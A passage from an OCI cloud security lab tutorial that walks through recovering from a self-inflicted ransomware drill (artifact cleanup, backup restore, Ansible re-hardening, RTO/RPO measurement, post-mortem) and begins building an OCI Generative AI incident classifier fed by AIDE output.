  "backup_integrity": "UNAFFECTED — OCI Object Storage WORM-locked backups intact",
  "severity": "HIGH",
  "status": "ACTIVE — recovery in progress"
}
EOF

cat /tmp/incident-detection-log.json
```

> **💼 Interview Insight — Incident Detection Order Matters:** "In our DR drill, I detected the attack through two independent signals: the Load Balancer health checks went critical, and AIDE reported filesystem changes. In a real incident, you want multiple detection mechanisms because attackers often try to blind one. If the attacker had also taken down the health check endpoint somehow, AIDE would still catch the filesystem changes. If they had somehow cleaned up filesystem artifacts, the LB health check would still show the application was unreachable. Defense in depth applies to detection, not just prevention."

---

### Step 25.4 — Recovery Procedure

The clock is running. Your RTO target is 30 minutes from detection. Follow this procedure in order — do not skip steps.

**Recovery starts at:** (note your current time)

#### Recovery Step 1: Remove attacker artifacts

```bash
# On k3s-server
# Remove the ransom note and persistence mechanism
sudo rm /etc/RANSOM_NOTE.txt
sudo rm /etc/cron.d/attacker-persistence

# Restore sshd_config permissions to hardened state
sudo chmod 600 /etc/ssh/sshd_config

# Verify no other unexpected cron jobs exist
sudo ls -la /etc/cron.d/
sudo crontab -l
```

#### Recovery Step 2: Restore scripts from Object Storage

```bash
# Extract recovery scripts from the backup archive you already downloaded
tar -xzvf /tmp/restored-backup.tar.gz backup-scripts/ -C /tmp/

# Restore to original locations
cp /tmp/backup-scripts/backup_to_oci.py \
    ~/oci-federal-lab-phase2/scripts/backup_to_oci.py
cp /tmp/backup-scripts/aide_parser.py \
    ~/oci-federal-lab-phase2/scripts/aide_parser.py

chmod +x ~/oci-federal-lab-phase2/scripts/backup_to_oci.py
chmod +x ~/oci-federal-lab-phase2/scripts/aide_parser.py

echo "Scripts restored."
```

#### Recovery Step 3: Re-run Ansible hardening playbook

The Ansible hardening playbook is your authoritative source of truth for system configuration. Running it again will:
- Restore `aide.conf` to its known-good state (overwrite the corrupted version)
- Re-apply all file permission settings (fix sshd_config and any other drift)
- Re-install any systemd service files
- Re-verify all hardening controls are in place

```bash
# From your WSL2 machine (Ansible control node)
cd ~/oci-federal-lab-phase2/ansible

ansible-playbook \
    -i inventory/inventory.ini \
    playbooks/site.yml \
    --limit k3s_server \
    --tags hardening \
    -v
```

Wait for the playbook to complete. It will show `changed` for the files it restores and `ok` for anything already correct.

#### Recovery Step 4: Restore the AIDE baseline

The AIDE baseline database was deleted by the attacker. Restore it from Object Storage:

```bash
# Extract just the aide-baseline from the backup
tar -xzvf /tmp/restored-backup.tar.gz aide-baseline/ -C /tmp/

# Restore to the AIDE database location
sudo cp /tmp/aide-baseline/aide.db.gz /var/lib/aide/aide.db.gz
sudo chown root:root /var/lib/aide/aide.db.gz
sudo chmod 600 /var/lib/aide/aide.db.gz

echo "AIDE baseline restored."
```

#### Recovery Step 5: Redeploy FedAnalytics to k3s

```bash
# On k3s-server
# The manifests were backed up — restore and apply them
tar -xzvf /tmp/restored-backup.tar.gz k3s-manifests/ -C /tmp/

# Apply the deployment manifest
sudo k3s kubectl apply -f /tmp/k3s-manifests/fedanalytics-deployment.yaml

# Apply the service manifest
sudo k3s kubectl apply -f /tmp/k3s-manifests/fedanalytics-service.yaml

# Watch pods come up (Ctrl+C when all are Running)
sudo k3s kubectl get pods -w
```

Expected output as pods recover:

```
NAME                           READY   STATUS              RESTARTS   AGE
fedanalytics-7d8f9b4c6-xk2pq   0/1     ContainerCreating   0          5s
fedanalytics-7d8f9b4c6-xk2pq   1/1     Running             0          23s
fedanalytics-7d8f9b4c6-mq7rn   0/1     ContainerCreating   0          5s
fedanalytics-7d8f9b4c6-mq7rn   1/1     Running             0          28s
```

#### Recovery Step 6: Verify application health

```bash
# From your local machine (WSL2)
# Give the LB health checks 30 seconds to register the pods as healthy
sleep 30

# Health check via Load Balancer
curl -s "http://${LOAD_BALANCER_IP}/health" | python3 -m json.tool
```

Expected output:

```json
{
  "status": "healthy",
  "service": "FedAnalytics",
  "record_count": 247,
  "database": "connected",
  "version": "1.0.0"
}
```

**The `record_count` must match your pre-attack baseline (247 in this example).** If it does, your RPO is confirmed: zero data loss.

#### Recovery Step 7: Verify AIDE shows a clean system

```bash
# On k3s-server — AIDE should show clean after restoration
sudo aide --check 2>&1 | tail -5
```

Expected:

```
### All files match AIDE database. Looks okay!
```

If AIDE still shows changes (because the Ansible playbook updated files that were in the pre-attack baseline), re-initialize the baseline after verifying the system is in a known-good state:

```bash
sudo aide --init
sudo mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz
echo "AIDE baseline re-established post-recovery."
```

**Record your recovery completion time:** (note the current time)

---

### Step 25.5 — Measure RTO/RPO

#### Calculate actual RTO

```bash
# Fill in your actual timestamps
ATTACK_DETECTED_TIME="2026-04-08T14:23:00Z"   # When LB health check failed + AIDE alert fired
RECOVERY_COMPLETE_TIME="2026-04-08T14:51:00Z"  # When /health returned healthy with correct record_count

# Calculate difference in minutes using Python (works on all platforms)
python3 - << 'PYEOF'
from datetime import datetime, timezone

attack_detected = datetime.fromisoformat("2026-04-08T14:23:00+00:00")
recovery_complete = datetime.fromisoformat("2026-04-08T14:51:00+00:00")

delta_seconds = int((recovery_complete - attack_detected).total_seconds())
delta_minutes = delta_seconds // 60

print(f"Actual RTO: {delta_minutes} minutes (target: 30 minutes)")
print(f"RTO met: {'YES' if delta_minutes <= 30 else 'NO — document reason in post-mortem'}")
PYEOF
```

#### Verify RPO

```bash
# Compare pre-attack record_count to post-recovery record_count
PRE_ATTACK_RECORD_COUNT=247   # From your /health baseline capture
POST_RECOVERY_RECORD_COUNT=$(curl -s "http://${LOAD_BALANCER_IP}/health" | \
    python3 -c "import sys, json; print(json.load(sys.stdin)['record_count'])")

echo "Pre-attack record count:  ${PRE_ATTACK_RECORD_COUNT}"
echo "Post-recovery record count: ${POST_RECOVERY_RECORD_COUNT}"

if [ "${PRE_ATTACK_RECORD_COUNT}" -eq "${POST_RECOVERY_RECORD_COUNT}" ]; then
    echo "RPO VERIFIED: Zero data loss. ADB data integrity confirmed."
else
    echo "RPO VIOLATION: Data discrepancy detected. Investigate immediately."
fi
```

#### Create the formal DR report

```bash
ACTUAL_RTO_MINUTES=28   # Replace with your measured value

cat > ~/oci-federal-lab-phase2/docs/dr-drill-report-$(date +%Y%m%d).json << EOF
{
  "report_type": "DR Drill Report",
  "drill_date": "$(date +%Y-%m-%d)",
  "environment": "OCI Always Free — Phase 2 FedAnalytics",
  "incident_simulated": "Ransomware attack — compute-layer resource destruction + config corruption",

  "targets": {
    "rto_target_minutes": 30,
    "rpo_target": "zero_data_loss"
  },

  "results": {
    "actual_rto_minutes": ${ACTUAL_RTO_MINUTES},
    "rto_met": true,
    "actual_rpo": "zero_data_loss",
    "rpo_met": true,
    "pre_attack_record_count": ${PRE_ATTACK_RECORD_COUNT},
    "post_recovery_record_count": ${POST_RECOVERY_RECORD_COUNT},
    "data_loss_records": 0
  },

  "what_survived_the_attack": [
    "OCI Autonomous Database — all records intact",
    "OCI Object Storage backups — WORM locks prevented deletion",
    "OCI Load Balancer configuration — managed service, outside compute plane",
    "Terraform state — stored in OCI, outside VM filesystem"
  ],

  "what_was_destroyed": [
    "k3s Kubernetes deployment (fedanalytics)",
    "k3s Kubernetes service (fedanalytics-service)",
    "Local recovery scripts (backup_to_oci.py, aide_parser.py)",
    "AIDE baseline database",
    "sshd_config permissions (widened to 777)",
    "aide.conf (appended with corrupt directives)"
  ],

  "recovery_procedure_followed": [
    "1. Removed attacker artifacts (ransom note, persistence cron)",
    "2. Restored scripts from Object Storage backup",
    "3. Re-ran Ansible hardening playbook (restored config drift)",
    "4. Restored AIDE baseline from Object Storage",
    "5. Redeployed FedAnalytics via kubectl apply",
    "6. Verified /health endpoint — record_count matched baseline",
    "7. Verified AIDE clean check"
  ],

  "detection_mechanisms_triggered": [
    "OCI Load Balancer health checks (backend status: Critical)",
    "AIDE file integrity check (3 added, 2 removed, 2 changed)"
  ]
}
EOF

echo "DR report saved."
cat ~/oci-federal-lab-phase2/docs/dr-drill-report-$(date +%Y%m%d).json
```

> **💼 Interview Insight — RTO/RPO in Federal Systems:** "FedRAMP doesn't specify exact RTO/RPO numbers — it requires you to define them in your Contingency Plan (CP-2) and then prove you can meet them. I set our RTO at 30 minutes and RPO at zero because ADB as a managed service makes zero data loss achievable by architecture. When I ran the drill, we hit 28 minutes — inside the target. The key insight I share in interviews: RPO of zero is only possible because the data lives on a managed service. If we had stored data on the compute node's local disk, any ransomware attack would be a data loss event. Choosing where to persist data is a disaster recovery decision, not just a database decision."

---

### Step 25.6 — DR Drill Post-Mortem

A post-mortem is not about blame — it is about systematically identifying what worked, what did not, and what you will improve before the next incident.

#### What worked well

```
1. AIDE detected every attacker action — zero missed changes
2. ADB data survived untouched — managed services provide inherent resilience
3. Object Storage backups were accessible even with local scripts deleted
4. Ansible playbook restored config drift in a single command
5. WORM retention locks prevented backup deletion (attacker could not reach them
   anyway, but the lock is belt-and-suspenders)
```

#### What could be improved

```
1. The parser script (aide_parser.py) was stored only on the local filesystem —
   the backup existed, but restoring it added steps. Next iteration: run the
   parser from a container image stored in OCIR (OCI Container Registry).

2. The AIDE baseline was not stored in Object Storage before the drill.
   In production, baseline promotion should trigger an automatic backup upload.

3. The Kubernetes manifests required a manual extraction from the tar archive.
   Next iteration: store manifests in a git repo with direct kubectl apply
   from the URL (no local copy required).

4. Recovery Step 3 (Ansible playbook) requires the control node to be separate
   from the attacked server. In this lab, if the control node were the same
   machine as k3s-server, the playbook infrastructure itself would be compromised.
   Lesson: keep your control plane separate from your managed nodes.
```

#### Lessons learned (reusable checklist)

| Lesson | Application |
|--------|-------------|
| Managed services = RPO zero | Always persist critical data to OCI managed services (ADB, Object Storage), not compute-local disk |
| Baseline before traffic | AIDE baseline must be established post-hardening and pre-production — never after traffic starts |
| Object Storage backups survive compute destruction | The backup target must be outside the blast radius of the primary failure |
| WORM locks are worth configuring even in labs | They build the muscle memory for doing it in production where it is mandatory |
| Ansible is your fastest recovery tool | A single playbook run fixed all config drift faster than manual remediation would have |
| Multiple detection mechanisms | LB health checks + AIDE caught the attack from two independent angles |

#### Portfolio Screenshot

Take a screenshot now and save it to `docs/screenshots/`:

**Split terminal showing:**
- Left pane: `curl http://your-load-balancer-ip/health` returning `record_count: 247` (or your count)
- Right pane: `sudo aide --check` showing "All files match AIDE database"

Name it `phase-2-day4-dr-recovery-complete.png`.

> **Why this screenshot?** It captures the entire Phase 2 narrative in one frame: the application is back online (LB responding), the data survived (record_count matches), and the system is clean (AIDE passed). A hiring manager who sees this immediately understands you can build, break, and recover — not just build.

---

> **💼 Interview Insight — Telling the Ransomware Drill Story:** "I ran a simulated ransomware attack against my own lab environment. The 'attacker' deleted the Kubernetes deployment, corrupted configuration files, and removed the local recovery tools. AIDE file integrity monitoring caught every change within seconds of the next check cycle. The key finding: our ADB data was completely untouched because OCI managed services run outside the compute plane. We recovered in 28 minutes against a 30-minute RTO target, and our RPO was zero — every record survived. The lesson I took away: disaster recovery is an architecture decision, not a recovery procedure. We hit RPO zero because we chose ADB. If we had used a local SQLite file, that would have been a data loss event."

---

### Phase 25 Troubleshooting

| Issue | Likely Cause | Fix |
|-------|-------------|-----|
| `kubectl delete deployment` returns "not found" | Deployment already gone or wrong namespace | Check `sudo k3s kubectl get deployments -A` for correct namespace |
| LB health check still shows healthy after deleting deployment | Health check interval delay (30-60 seconds) | Wait 60 seconds and refresh OCI Console — the LB checks on a schedule |
| `curl http://lb-ip/health` succeeds after attack | Connection hitting cached response or a pod is still terminating | `sudo k3s kubectl get pods -A` — wait for all pods to show `Terminating` then `0/0` |
| Ansible playbook fails during recovery | SSH key or inventory issue | Verify `ansible.cfg` still points to correct key path; re-test with `ansible -m ping all` |
| `oci os object get` fails during recovery | OCI CLI config corrupted or instance principal expired | Re-authenticate: `oci session authenticate` or verify `~/.oci/config` is intact |
| `kubectl apply` pods stuck in `ContainerCreating` | Image pull failing (OCIR auth expired) | `sudo k3s kubectl describe pod pod-name-here` — check image pull error; re-create imagePullSecret |
| `record_count` is 0 after recovery | ADB wallet not restored correctly | Verify wallet path matches app config; check `/health` database field shows "connected" not "error" |
| AIDE still shows changes after recovery | Ansible changed files that were in the old baseline | This is expected — reinitialize baseline with `sudo aide --init && sudo mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz` |
| RTO exceeded 30 minutes | Recovery steps took longer than estimated | Document actual time, identify slowest step, add to lessons learned — this is a realistic outcome and still demonstrates the capability |
| Post-mortem not saved | File write permission issue | Write to `~/oci-federal-lab-phase2/docs/` instead of `/etc/` or other restricted paths |

---

## PHASE 2 — DAY 4 COMPLETE

**Day 4 covered Phases 24, 24A, and 25:** AIDE file integrity monitoring (install, baseline, detect, automate), OCI Object Storage backup architecture (bucket, versioning, WORM locks, lifecycle policies, Python backup script), and the full ransomware simulation DR drill (pre-attack baseline, attack, detection, recovery, RTO/RPO measurement, post-mortem).

**Skills demonstrated today:**
- AIDE configuration, initialization, and automated cron scheduling (NIST 800-53 SI-7)
- File integrity parsing with Python (structured JSON output for SIEM integration)
- OCI Object Storage — bucket creation, versioning, WORM retention rules, lifecycle policies
- OCI SDK Python integration (object upload, download, namespace resolution)
- Kubernetes disaster recovery — delete, detect, redeploy from backup
- Ansible idempotent remediation — single playbook run restores config drift
- RTO/RPO measurement against defined targets
- DR report creation (interview-ready documentation)
- Post-mortem format (lessons learned, reusable checklist)

**Artifacts created today:**
- `scripts/aide_parser.py` — AIDE output parser producing structured JSON incident reports
- `scripts/backup_to_oci.py` — OCI SDK backup script with dry-run, checksums, manifest upload
- `/usr/local/bin/fedanalytics-aide-daily-check.sh` — cron-compatible AIDE automation script
- `docs/dr-drill-report-YYYYMMDD.json` — formal DR drill report with RTO/RPO measurements
- `docs/screenshots/phase-2-day4-dr-recovery-complete.png` — portfolio screenshot

**Interview story you can now tell:**
- "I implemented AIDE file integrity monitoring to satisfy NIST 800-53 SI-7, with a custom Python parser that produces SIEM-ready JSON output."
- "I designed backup architecture using OCI Object Storage with WORM retention locks so that backups survive even a full compute-layer compromise."
- "I ran a simulated ransomware attack, measured our actual RTO at 28 minutes against a 30-minute target, and achieved RPO of zero because the data lived on ADB — a managed service outside the compute blast radius."

**Next:** Phase 2 Day 5 — OCI Generative AI incident classification, combined security reporting, and Phase 2 wrap-up.

---

## PHASE 26: OCI GENERATIVE AI — INCIDENT CLASSIFIER (1.5 hrs)
**Day 5 — Morning**

### Step 26.1 — Why Cloud AI vs Local AI?

📍 **Where work happens:** Your local machine (conceptual review) + OCI Console

In Phase 1, you ran Ollama — an open-source LLM runtime that you installed directly on your VM. The model ran on your hardware, used your CPU/RAM, and all data stayed inside your network boundary. In Phase 2, you use OCI Generative AI: Oracle manages the model, the GPU cluster, scaling, and availability. You call it over HTTPS.

> **🧠 ELI5 — Local AI vs Cloud AI:** Imagine you need a translator. Local AI (Ollama) is like hiring a full-time translator who lives in your house — you pay for their food and bed every day, even when they're idle, but they never leave your property and your secrets stay home. Cloud AI (OCI GenAI) is like calling a translation agency — they have expert translators on staff 24/7, you only pay per page translated, but your document does leave your building to get translated. For a lab and most corporate workloads, the cloud version is cheaper and more capable. For top-secret classified workloads, local wins every time.

**Trade-off table:**

| Factor | Local AI (Ollama — Phase 1) | Cloud AI (OCI GenAI — Phase 2) |
|--------|-----------------------------|--------------------------------|
| GPU hardware required | Yes — your server carries the load | No — Oracle's GPU fleet handles it |
| Model quality | Limited by your available VRAM | Access to large models (Cohere Command R+) |
| Data leaves your network | No — everything stays on-prem | Yes — payload sent to OCI API endpoint |
| Cost at lab scale | $0 but consumes free OCPU/RAM | Free tier available for text generation |
| Operational overhead | You manage model updates, restarts | Oracle manages the service |
| FedRAMP applicability | Best for IL4/IL5 air-gapped workloads | Appropriate for most FedRAMP Moderate use cases |
| Interview differentiator | "I ran local inference without a GPU" | "I integrated cloud-managed AI and understood the trade-offs" |

**OCI Generative AI availability:**

OCI Generative AI is available in the **us-chicago-1** (Chicago) region. If your Phase 2 infrastructure is in a different region (e.g., Ashburn), you will call the Chicago endpoint from your app server — this is a cross-region API call and is entirely supported. The service has a free tier for text generation (at time of writing — verify current limits in OCI documentation before your session).

> **💼 Interview Insight — Local vs Cloud AI Decision:** "When would you choose local inference over cloud AI?"
>
> **Strong answer:** "It depends on the data classification and workload profile. For Phase 1, I used Ollama because I was learning local inference patterns and the data was sensitive — it never left the host. For Phase 2, I switched to OCI Generative AI because the payload is security alert metadata (not the raw data), the cloud model is significantly more capable for classification tasks, and there's no GPU to provision. In a real federal environment, I'd ask: what's the data classification, what's the ATO boundary, and is the cloud service already in the authorization scope? If it's on the approved services list, cloud AI wins on cost and capability."

---

### Step 26.2 — Enable OCI Generative AI Service

📍 **Where work happens:** OCI Console (browser)

**Navigate to the service:**

1. Log in to OCI Console → top-left hamburger menu
2. Navigate to: **Analytics & AI** → **AI Services** → **Generative AI**
3. If you do not see the menu item, confirm you are in the **us-chicago-1** region (top-right region selector)

**Verify service availability:**

On the Generative AI landing page you should see:
- **Playground** — lets you test models interactively in the browser (use this first)
- **Dedicated AI Clusters** — not needed for Always Free usage
- **Model endpoints** — the inference endpoint you will call from code

**Note your endpoint and compartment OCID:**

```
Inference endpoint (Chicago):
https://inference.generativeai.us-chicago-1.oci.oraclecloud.com

Your compartment OCID:
ocid1.compartment.oc1..aaaaaaaXXXXXXXXXXXXXXXXXX
(find this in: OCI Console → Identity → Compartments → your compartment)
```

**Test in the Playground before writing any code:**

1. OCI Console → Generative AI → Playground → **Generation**
2. Select model: **cohere.command-r-plus** (or the latest Cohere Command R+ variant shown)
3. Paste this test prompt:

```
SECURITY ALERT CLASSIFICATION REQUEST

Event: AIDE file integrity check detected change
File: /etc/ssh/sshd_config
Change type: Content modified
Timestamp: 2024-01-15T02:34:11Z
Server: fedanalytics-app-server

Classify this security event with:
- severity: Critical / Warning / Info
- category: one short phrase
- recommended_action: one sentence

Respond in JSON only.
```

4. Click **Generate** — you should receive a structured JSON response
5. Screenshot this for your portfolio

> **🧠 ELI5 — Model Endpoints:** A model endpoint is just a URL that accepts your text and returns text. The model lives somewhere on Oracle's servers in Chicago. When your Python code calls that URL, it sends your prompt over HTTPS, Oracle's model processes it, and the response comes back in the HTTP response body. No GPU on your side — just a regular HTTPS POST request.

**Capture your endpoint URL and compartment OCID** — you will use both in the next step.

---

### Step 26.3 — Build the Incident Classifier

📍 **Where work happens:** App server VM (via SSH through bastion)

**Install the OCI Python SDK:**

```bash
# SSH to your app server through the bastion
ssh -J opc@<your-bastion-public-ip> opc@<your-app-server-private-ip>

# Install the OCI SDK (includes the generative AI inference client)
pip3 install oci --user

# Verify the install
python3 -c "import oci; print('OCI SDK version:', oci.__version__)"
```

**Create the classifier script:**

```bash
mkdir -p ~/fedanalytics/ai
cat > ~/fedanalytics/ai/incident_classifier.py << 'PYEOF'
#!/usr/bin/env python3
"""
incident_classifier.py — OCI Generative AI Incident Classifier

Reads security event data from stdin (AIDE output, log lines, or raw text),
sends it to OCI Generative AI (Cohere Command R+) for classification,
and returns structured JSON with severity, category, and recommended action.

Usage:
    echo "AIDE alert text..." | python3 incident_classifier.py
    sudo aide --check 2>&1 | python3 incident_classifier.py
    cat aide_report.txt | python3 incident_classifier.py
"""

import sys
import json
import re
import oci
from datetime import datetime

# ---------------------------------------------------------------
# CONFIGURATION — update these values for your environment
# ---------------------------------------------------------------

# Your compartment OCID (OCI Console → Identity → Compartments)
COMPARTMENT_OCID = "<YOUR_COMPARTMENT_OCID>"

# OCI Generative AI inference endpoint for Chicago region
GENAI_ENDPOINT = "https://inference.generativeai.us-chicago-1.oci.oraclecloud.com"

# Model to use — Cohere Command R+ is available on Always Free tier
MODEL_ID = "cohere.command-r-plus"

# Maximum tokens for the response (keep short for structured output)
MAX_TOKENS = 512

# ---------------------------------------------------------------
# PROMPT TEMPLATE
# ---------------------------------------------------------------

CLASSIFICATION_PROMPT_TEMPLATE = """You are a federal cybersecurity incident classifier.
Analyze the following security event data and classify it.

SECURITY EVENT DATA:
{event_data}

CLASSIFICATION RULES:
- Critical: unauthorized binary modification, SSH config change, sudoers file change, cron job added, kernel module changed
- Warning: application config modified, log file tampered, non-critical system file changed, new user account created
- Info: log rotation, scheduled task ran, temporary file change, documentation file updated

Respond ONLY with valid JSON in this exact format, no other text:
{{
  "severity": "Critical" | "Warning" | "Info",
  "category": "<short phrase describing the event type>",
  "affected_files": ["<file1>", "<file2>"],
  "recommended_action": "<one sentence describing what the operator should do>",
  "nist_control": "<most relevant NIST 800-53 control ID, e.g. SI-7>",
  "confidence": "High" | "Medium" | "Low"
}}"""


def load_oci_config():
    """
    Load OCI credentials.
    Tries instance principals first (works when running on OCI VM),
    falls back to ~/.oci/config file (works from local machine).
    """
    try:
        # Instance principals — no config file needed on OCI compute
        signer = oci.auth.signers.InstancePrincipalsSecurityTokenSigner()
        print("[INFO] Using instance principals authentication", file=sys.stderr)
        return None, signer
    except Exception as instance_principal_error:
        print(f"[INFO] Instance principals not available: {instance_principal_error}", file=sys.stderr)

    try:
        # Fall back to ~/.oci/config file
        config = oci.config.from_file()
        oci.config.validate_config(config)
        print("[INFO] Using ~/.oci/config file authentication", file=sys.stderr)
        return config, None
    except Exception as config_file_error:
        print(f"[ERROR] Could not load OCI credentials: {config_file_error}", file=sys.stderr)
        print("[ERROR] Either configure instance principals or create ~/.oci/config", file=sys.stderr)
        sys.exit(1)


def build_genai_client(oci_config, signer):
    """Create the Generative AI inference client."""
    if signer is not None:
        # Instance principals path
        client = oci.generative_ai_inference.GenerativeAiInferenceClient(
            config={},
            signer=signer,
            service_endpoint=GENAI_ENDPOINT
        )
    else:
        # Config file path
        client = oci.generative_ai_inference.GenerativeAiInferenceClient(
            config=oci_config,
            service_endpoint=GENAI_ENDPOINT
        )
    return client


def classify_security_event(event_text):
    """
    Send security event text to OCI GenAI for classification.
    Returns a dict with severity, category, recommended_action, etc.
    """
    oci_config, signer = load_oci_config()
    client = build_genai_client(oci_config, signer)

    # Build the prompt
    prompt = CLASSIFICATION_PROMPT_TEMPLATE.format(event_data=event_text[:3000])  # cap at 3000 chars

    # Build the inference request
    chat_request = oci.generative_ai_inference.models.CohereChatRequest(
        message=prompt,
        max_tokens=MAX_TOKENS,
        temperature=0.1,       # Low temperature = more deterministic, better for classification
        frequency_penalty=0,
        presence_penalty=0,
        top_p=0.75,
        top_k=0,
    )

    chat_detail = oci.generative_ai_inference.models.ChatDetails(
        serving_mode=oci.generative_ai_inference.models.OnDemandServingMode(
            model_id=MODEL_ID
        ),
        compartment_id=COMPARTMENT_OCID,
        chat_request=chat_request,
    )

    try:
        response = client.chat(chat_detail)
        raw_text = response.data.chat_response.text.strip()
    except oci.exceptions.ServiceError as service_err:
        return {
            "severity": "Unknown",
            "category": "Classifier error",
            "affected_files": [],
            "recommended_action": f"OCI GenAI API error: {service_err.message}",
            "nist_control": "N/A",
            "confidence": "Low",
            "error": str(service_err)
        }
    except Exception as unexpected_err:
        return {
            "severity": "Unknown",
            "category": "Classifier error",
            "affected_files": [],
            "recommended_action": f"Unexpected error: {unexpected_err}",
            "nist_control": "N/A",
            "confidence": "Low",
            "error": str(unexpected_err)
        }

    # Parse the JSON response — model should return only JSON
    # Strip any markdown fences the model may have added
    json_text = re.sub(r"^```(?:json)?\s*", "", raw_text)
    json_text = re.sub(r"\s*```$", "", json_text)

    try:
        classification = json.loads(json_text)
    except json.JSONDecodeError:
        # Model returned something unexpected — return raw text for debugging
        classification = {
            "severity": "Unknown",
            "category": "Parse error — model response was not valid JSON",
            "affected_files": [],
            "recommended_action": "Review raw model output and re-run",
            "nist_control": "N/A",
            "confidence": "Low",
            "raw_model_output": raw_text
        }

    return classification


def format_security_report(classification, event_text):
    """Format the classification result as a human-readable security report."""
    severity = classification.get("severity", "Unknown")
    timestamp = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")

    # Severity markers for terminal readability
    severity_marker = {"Critical": "[CRITICAL]", "Warning": "[WARNING]", "Info": "[INFO]"}.get(severity, "[UNKNOWN]")

    report_lines = [
        "=" * 60,
        "  FEDANALYTICS SECURITY INCIDENT REPORT",
        f"  Generated: {timestamp}",
        "=" * 60,
        f"  Severity:          {severity_marker}  {severity}",
        f"  Category:          {classification.get('category', 'N/A')}",
        f"  NIST Control:      {classification.get('nist_control', 'N/A')}",
        f"  Confidence:        {classification.get('confidence', 'N/A')}",
        "",
        "  Affected Files:",
    ]

    for affected_file in classification.get("affected_files", []):
        report_lines.append(f"    - {affected_file}")

    report_lines += [
        "",
        "  Recommended Action:",
        f"    {classification.get('recommended_action', 'N/A')}",
        "=" * 60,
        "",
        "  Raw Classification (JSON):",
        json.dumps(classification, indent=2),
        "=" * 60,
    ]

    return "\n".join(report_lines)


def main():
    # Read event data from stdin
    if sys.stdin.isatty():
        print("[ERROR] No input provided.", file=sys.stderr)
        print("Usage: echo 'event text' | python3 incident_classifier.py", file=sys.stderr)
        print("   or: sudo aide --check 2>&1 | python3 incident_classifier.py", file=sys.stderr)
        sys.exit(1)

    event_text = sys.stdin.read().strip()

    if not event_text:
        print("[ERROR] Input was empty — nothing to classify.", file=sys.stderr)
        sys.exit(1)

    print(f"[INFO] Received {len(event_text)} characters of event data", file=sys.stderr)
    print("[INFO] Sending to OCI Generative AI for classification...", file=sys.stderr)

    classification = classify_security_event(event_text)
    report = format_security_report(classification, event_text)

    print(report)

    # Exit with non-zero code if severity is Critical (useful for pipeline alerting)
    if classification.get("severity") == "Critical":
        sys.exit(2)


if __name__ == "__main__":
    main()
PYEOF

chmod +x ~/fedanalytics/ai/incident_classifier.py
echo "Classifier script created"
```

**Command explanation:**

| Part | What it does |
|------|-------------|
| `oci.auth.signers.InstancePrincipalsSecurityTokenSigner()` | Authenticates using the VM's identity — no config file needed, no secrets to rotate |
| `CohereChatRequest(temperature=0.1)` | Low temperature makes the model deterministic — important for classification, you want consistent answers |
| `OnDemandServingMode(model_id=MODEL_ID)` | Uses OCI's shared model pool instead of a dedicated GPU cluster (required for Always Free usage) |
| `re.sub(r"^` `` `(?:json)?..."` | Strips markdown code fences the model sometimes wraps around its JSON output |
| `sys.exit(2)` on Critical | Lets shell scripts and Jenkins pipelines detect a Critical classification via exit code |

> **🧠 ELI5 — Instance Principals:** Normally to call OCI APIs from code, you put your API key in `~/.oci/config`. But if your code runs on an OCI VM, there's a better way: the VM itself has an identity (like a digital badge). Instance principals let your code say "I am this OCI compute instance" — Oracle verifies it via a token the VM gets automatically. No keys to store, no secrets to rotate. It's like how an employee badge works inside a building: the building already knows who you are, no extra password needed.

**Update your compartment OCID in the script:**

```bash
# Get your compartment OCID
oci iam compartment list \
  --query "data[?\"lifecycle-state\"=='ACTIVE'].{Name:name, OCID:id}" \
  --output table

# Edit the script to replace the placeholder
sed -i 's|<YOUR_COMPARTMENT_OCID>|ocid1.compartment.oc1..YOUR_ACTUAL_OCID|g' \
    ~/fedanalytics/ai/incident_classifier.py
```

---

### Step 26.4 — Integrate with AIDE

📍 **Where work happens:** App server VM

**Run a quick connectivity test first:**

```bash
# Test with a simple synthetic event before touching AIDE
echo "File /etc/ssh/sshd_config was modified. MD5 checksum changed from abc123 to def456." \
  | python3 ~/fedanalytics/ai/incident_classifier.py
```

Expected output:
```
============================================================
  FEDANALYTICS SECURITY INCIDENT REPORT
  Generated: 2024-01-15T09:22:14Z
============================================================
  Severity:          [CRITICAL]  Critical
  Category:          SSH configuration modification
  NIST Control:      SI-7
  Confidence:        High

  Affected Files:
    - /etc/ssh/sshd_config

  Recommended Action:
    Immediately review /etc/ssh/sshd_config for unauthorized changes,
    compare against version-controlled baseline, and investigate who
    had access to the system between last known-good state and now.
============================================================
```

**Pipe live AIDE output through the classifier:**

```bash
# Run AIDE check and classify results in one pipeline
sudo aide --check 2>&1 | python3 ~/fedanalytics/ai/incident_classifier.py

# If AIDE finds no changes, there is nothing interesting to classify
# Trigger a safe test change first:
sudo touch /etc/motd  # modify the message-of-the-day file (harmless)
sudo aide --check 2>&1 | python3 ~/fedanalytics/ai/incident_classifier.py
```

**Create the combined AIDE + classifier + report script:**

```bash
cat > ~/fedanalytics/ai/security_report.sh << 'SHEOF'
#!/usr/bin/env bash
# security_report.sh — Run AIDE integrity check, classify results with OCI GenAI,
# and write a timestamped security report to the reports directory.

set -euo pipefail

REPORTS_DIR="${HOME}/fedanalytics/security_reports"
TIMESTAMP=$(date +%Y%m%d-%H%M%S)
REPORT_FILE="${REPORTS_DIR}/security-report-${TIMESTAMP}.txt"
AIDE_OUTPUT_FILE="${REPORTS_DIR}/aide-raw-${TIMESTAMP}.txt"

mkdir -p "${REPORTS_DIR}"

echo "=== FedAnalytics Security Scan — ${TIMESTAMP} ===" | tee "${REPORT_FILE}"
echo "" | tee -a "${REPORT_FILE}"

# --- Step 1: Run AIDE integrity check ---
echo "[1/3] Running AIDE file integrity check..." | tee -a "${REPORT_FILE}"
sudo aide --check > "${AIDE_OUTPUT_FILE}" 2>&1 || true
# Note: AIDE exits non-zero if it finds changes — that is expected, do not let set -e stop us

AIDE_LINE_COUNT=$(wc -l < "${AIDE_OUTPUT_FILE}")
echo "  AIDE scan complete — ${AIDE_LINE_COUNT} lines of output" | tee -a "${REPORT_FILE}"

# --- Step 2: Check if AIDE found any changes ---
if grep -q "found differences" "${AIDE_OUTPUT_FILE}" 2>/dev/null \
   || grep -q "changed:" "${AIDE_OUTPUT_FILE}" 2>/dev/null \
   || grep -q "added:" "${AIDE_OUTPUT_FILE}" 2>/dev/null \
   || grep -q "removed:" "${AIDE_OUTPUT_FILE}" 2>/dev/null; then
    echo "  [!] AIDE detected file system changes — classifying with OCI GenAI..." | tee -a "${REPORT_FILE}"

    # --- Step 3: Classify with OCI GenAI ---
    echo "" | tee -a "${REPORT_FILE}"
